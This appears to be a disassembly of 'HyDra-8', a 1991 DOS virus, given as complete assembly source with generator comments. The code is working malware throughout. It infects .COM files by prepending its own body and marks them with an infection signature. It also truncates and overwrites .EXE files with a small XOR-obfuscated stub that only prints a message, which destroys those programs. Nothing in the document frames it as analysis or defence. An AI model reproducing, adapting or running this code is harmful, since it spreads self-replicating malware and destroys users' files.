
PAGE  59,132

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл								         лл
;лл			        HYDRA8				         лл
;лл								         лл
;лл      Created:   28-Aug-91					         лл
;лл      Passes:    5	       Analysis Options on: W		         лл
;лл      Copyright (c)						         лл
;лл								         лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

psp_cmd_size	equ	80h
data_17e	equ	1EFh
data_18e	equ	1F2h
data_19e	equ	9D9Ah

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

hydra8		proc	far

start:
		jmp	loc_3
		db	 59h, 44h, 00h, 00h
data_3		db	'HyDra-8   Beta - Not For Release'
		db	'. *.CO?'
		db	0
data_6		dw	0, 8B39h
data_8		dw	0
data_9		db	0
		db	18 dup (0)
data_10		db	0
		db	10 dup (0)
data_11		db	0
		db	0, 0, 0, 0, 0, 0
data_12		db	0
		db	0, 0, 0, 0, 0, 0
copyright	db	'Copyright (c)'
		db	'  1991 by C.A.V.E.  '
data_13		db	2Ah
		db	 2Eh, 45h, 58h, 45h, 00h
data_14		db	33h
		db	0C9h, 1Eh, 52h,0E8h, 06h, 00h
		db	0E8h, 13h, 00h,0EBh, 36h, 90h
		db	0BEh, 48h, 01h
		db	0BFh, 5Ah, 01h,0B9h, 12h, 00h

locloop_1:
		xor	byte ptr [si],0F5h
		movsb				; Mov [si] to es:[di]
		loop	locloop_1		; Loop if cx > 0

		retn
		db	0B8h, 00h, 0Fh,0CDh, 10h,0B4h
		db	 00h,0CDh, 10h,0B8h, 00h, 02h
		db	0B6h, 0Ch,0B2h, 1Fh,0CDh, 10h
		db	 33h,0D2h
		db	0BAh, 5Ah, 01h,0B4h, 09h,0CDh
		db	 21h,0B8h, 00h, 02h,0B6h, 18h
		db	0B2h, 00h,0CDh, 10h,0C3h
		db	0B8h, 00h, 4Ch,0CDh, 21h, 00h
		db	0A2h, 9Dh, 9Ah,0F5h, 9Ch, 86h
		db	0F5h
		db	0BFh, 9Ah, 9Dh, 9Bh,0F5h,0B2h
		db	 94h, 99h, 81h,0CAh,0D1h
loc_3:
		push	ax
		mov	ax,cs
		add	ax,1000h
		xor	di,di			; Zero register
		mov	cx,1EFh
		mov	si,100h
		mov	es,ax
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	ah,1Ah
		mov	dx,offset data_9
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		mov	ah,4Eh			; 'N'
		mov	dx,offset data_3+22h	; ('*')
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jc	loc_7			; Jump if carry Set
loc_4:
		mov	ah,3Dh			; '='
		mov	al,2
		mov	dx,offset data_11
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	bx,ax
		push	es
		pop	ds
		mov	ax,3F00h
		mov	cx,0FFFFh
		mov	dx,data_17e
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		add	ax,1EFh
		mov	cs:data_8,ax
		cmp	word ptr ds:data_18e,4459h
		jne	loc_5			; Jump if not equal
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		push	cs
		pop	ds
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jc	loc_8			; Jump if carry Set
		jmp	short loc_4
loc_5:
		xor	cx,cx			; Zero register
		mov	dx,cx
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_6			; Jump if carry Set
		mov	ah,40h			; '@'
		xor	dx,dx			; Zero register
		mov	cx,cs:data_8
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
loc_6:
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		push	cs
		pop	ds
loc_7:
		mov	ah,1Ah
		mov	dx,psp_cmd_size
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		jmp	short loc_11
		db	90h
loc_8:
		clc				; Clear carry flag
		xor	cx,cx			; Zero register
		push	ds
		push	dx
		mov	ah,1Ah
		mov	dx,offset data_9
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		mov	dx,offset data_13
		mov	ah,4Eh			; 'N'
		xor	cx,cx			; Zero register
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jc	loc_7			; Jump if carry Set
loc_9:
		mov	ah,3Ch			; '<'
		xor	cx,cx			; Zero register
		mov	dx,offset data_11
		int	21h			; DOS Services  ah=function 3Ch
						;  create/truncate file @ ds:dx
		mov	bx,ax
		jc	loc_7			; Jump if carry Set
		mov	ax,3D02h
		mov	dx,offset data_11
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	bx,ax
		clc				; Clear carry flag
		xor	dx,dx			; Zero register
		mov	ah,40h			; '@'
		mov	dx,offset data_14
		mov	cx,5Ah
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		cmp	ax,5Ah
		jb	loc_10			; Jump if below
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jc	loc_10			; Jump if carry Set
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jnc	loc_9			; Jump if carry=0
loc_10:
		mov	ax,4C00h
		int	21h			; DOS Services  ah=function 4Ch
						;  terminate with al=return code
loc_11:
		xor	di,di			; Zero register
		mov	si,offset data_15
		mov	cx,22h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		pop	bx
		mov	cs:data_6,0
		mov	word ptr cs:data_6+2,es
		pop	bx
		jmp	dword ptr cs:data_6
data_15		db	1Eh
		db	 07h,0B9h,0FFh,0FFh,0BEh,0EFh
		db	 02h,0BFh, 00h, 01h, 2Bh,0CEh
		db	0F3h,0A4h, 2Eh,0C7h, 06h, 00h
		db	 01h, 00h, 01h, 2Eh, 8Ch, 1Eh
		db	 02h, 01h, 8Bh,0C3h, 2Eh,0FFh
		db	 2Eh, 00h, 01h,0CDh
		db	20h

hydra8		endp

seg_a		ends



		end	start
